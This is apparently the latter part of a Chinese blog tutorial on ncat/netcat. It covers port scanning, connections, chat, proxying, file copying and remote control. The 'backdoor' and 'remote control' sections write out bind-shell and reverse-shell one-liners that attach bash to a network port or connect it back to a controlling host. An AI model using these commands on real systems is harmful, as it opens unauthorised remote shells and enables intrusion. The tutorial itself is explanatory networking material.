    <i class="fa-solid fa-link" aria-hidden="true" title="@"></i>
    <span class="sr-only">@</span>
  </a>
</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -v -z -w2 127.0.0.1 1-100 <span class="c1"># 扫描本机范围是 1-100的TCP端口，超时时间为2s</span>
</span></span><span class="line"><span class="cl">nc -u -z -w2 127.0.0.1 1-1000 <span class="c1"># 扫描本机范围是 1-1000的UDP端口，超时时间为2s</span>
</span></span><span class="line"><span class="cl">nc -nvv 127.0.0.1 <span class="m">80</span> <span class="c1"># 扫描指定端口</span>
</span></span></code></pre></div>

<h2 id="端口连接">
  端口连接
  <a class="heading-link" href="#%e7%ab%af%e5%8f%a3%e8%bf%9e%e6%8e%a5">
    <i class="fa-solid fa-link" aria-hidden="true" title="@"></i>
    <span class="sr-only">@</span>
  </a>
</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#监听端口</span>
</span></span><span class="line"><span class="cl">ncat -l <span class="m">8080</span>
</span></span><span class="line"><span class="cl"><span class="c1">#连接远程系统</span>
</span></span><span class="line"><span class="cl">ncat 192.168.1.100 <span class="m">80</span>
</span></span><span class="line"><span class="cl"><span class="c1">#连接udp端口</span>
</span></span><span class="line"><span class="cl">ncat -l -u <span class="m">1234</span>
</span></span><span class="line"><span class="cl"><span class="c1">#测试端口连通性</span>
</span></span><span class="line"><span class="cl">ncat -v -u 192.168.105.150 <span class="m">53</span>
</span></span></code></pre></div>

<h2 id="聊天工具">
  聊天工具
  <a class="heading-link" href="#%e8%81%8a%e5%a4%a9%e5%b7%a5%e5%85%b7">
    <i class="fa-solid fa-link" aria-hidden="true" title="@"></i>
    <span class="sr-only">@</span>
  </a>
</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#nc作为聊天工具</span>
</span></span><span class="line"><span class="cl">ncat -l <span class="m">8080</span>     <span class="c1"># 服务端</span>
</span></span><span class="line"><span class="cl">ncat 192.168.1.100 <span class="m">8080</span>    <span class="c1">#客户端</span>
</span></span></code></pre></div>

<h2 id="代理转发">
  代理转发
  <a class="heading-link" href="#%e4%bb%a3%e7%90%86%e8%bd%ac%e5%8f%91">
    <i class="fa-solid fa-link" aria-hidden="true" title="@"></i>
    <span class="sr-only">@</span>
  </a>
</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#作为代理</span>
</span></span><span class="line"><span class="cl"><span class="c1">#发往服务器 8080 端口的连接都会自动转发到 192.168.1.200 上的 80 端口</span>
</span></span><span class="line"><span class="cl">ncat -l <span class="m">8080</span> <span class="p">|</span> ncat 192.168.1.200 <span class="m">80</span>
</span></span><span class="line"><span class="cl"><span class="c1">#同时能够接受返回的数据，我们需要创建一个双向管道</span>
</span></span><span class="line"><span class="cl">ncat -l <span class="m">8080</span> 0&lt;2way <span class="p">|</span> ncat 192.168.1.200 <span class="m">80</span> 1&gt;2way
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#端口转发, 连接到 80 端口的连接都会转发到 8080 端口</span>
</span></span><span class="line"><span class="cl">ncat -u -l  <span class="m">80</span> -c  <span class="s1">&#39;ncat -u -l 8080&#39;</span>
</span></span></code></pre></div>

<h2 id="创建后门">
  创建后门
  <a class="heading-link" href="#%e5%88%9b%e5%bb%ba%e5%90%8e%e9%97%a8">
    <i class="fa-solid fa-link" aria-hidden="true" title="@"></i>
    <span class="sr-only">@</span>
  </a>
</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#创建后门, -e 标志将一个 bash 与端口 10000 相连</span>
</span></span><span class="line"><span class="cl">ncat -l <span class="m">10000</span> -e /bin/bash
</span></span><span class="line"><span class="cl"><span class="c1">#客户端只要连接到服务器上的 10000 端口就能通过 bash 获取我们系统的完整访问权限</span>
</span></span><span class="line"><span class="cl">ncat 192.168.1.100 <span class="m">10000</span>
</span></span></code></pre></div>

<h2 id="文件拷贝">
  文件拷贝
  <a class="heading-link" href="#%e6%96%87%e4%bb%b6%e6%8b%b7%e8%b4%9d">
    <i class="fa-solid fa-link" aria-hidden="true" title="@"></i>
    <span class="sr-only">@</span>
  </a>
</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#拷贝文件， -–send-only 选项会在文件拷贝完后立即关闭连接</span>
</span></span><span class="line"><span class="cl">ncat -l  <span class="m">8080</span> &gt; file.txt    <span class="c1"># 监听</span>
</span></span><span class="line"><span class="cl">ncat 192.168.1.100 <span class="m">8080</span> --send-only &lt; data.txt <span class="c1">#目标机器把文件传过来</span>
</span></span></code></pre></div>

<h2 id="远程控制">
  远程控制
  <a class="heading-link" href="#%e8%bf%9c%e7%a8%8b%e6%8e%a7%e5%88%b6">
    <i class="fa-solid fa-link" aria-hidden="true" title="@"></i>
    <span class="sr-only">@</span>
  </a>
</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 正向控制，被控端主动设置监听端口及bash环境，控制端连接，如果有防火墙，需开放端口，否则会被拦截。</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 被控制端执行下面的命令：</span>
</span></span><span class="line"><span class="cl">nc -lvnp <span class="m">8888</span> -c bash
</span></span><span class="line"><span class="cl"><span class="c1"># 控制端执行下面的命令：</span>
</span></span><span class="line"><span class="cl">nc 192.168.xxx.xxx <span class="m">8888</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 反向控制，控制端设置监听端口，被控端主动连接控制端的ip及端口，并提供bash环境。</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 控制端执行下面的命令：</span>
</span></span><span class="line"><span class="cl">nc -lvnp <span class="m">8888</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 被控制端执行下面的命令：</span>
</span></span><span class="line"><span class="cl">nc 192.168.75.121 <span class="m">8888</span> -c bash
</span></span></code></pre></div>

<h2 id="总结">
  总结
  <a class="heading-link" href="#%e6%80%bb%e7%bb%93">
    <i class="fa-solid fa-link" aria-hidden="true" title="@"></i>
    <span class="sr-only">@</span>
  </a>
</h2>
<p>ncat 用法太多，因为 ncat 本质是用于操作 tcp 和 udp 连接数据流的，所以理论上所有基于 4 层网络的操作都可以使用 ncat 来处理，在日常运维中还有更多用法，各位可以继续探索！</p>

    </div>


    <footer>
      







      <div id="tcomment"></div>
    </footer>
  </article>

</section>





  <script src="/js/twiko.all.min.js"></script>
  <script>
    window.addEventListener('load', () => {
      twikoo.init({
        envId: 'https://twikoo-inaho.netlify.app/.netlify/functions/twikoo',
        el: '#tcomment'
      });
    });
  </script>


    </div>

    <footer class="footer">
  <section class="container">
    
    ©
    
      2019 -
    
    2025

    
     inaho 
    ·
    
    

    
    技术支持 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
    
    
    
  </section>
</footer>

  </main>

  

  
  
  <script src="/js/coder.js"></script>
  

  

  


  

  

  

  

  
</body>
</html>
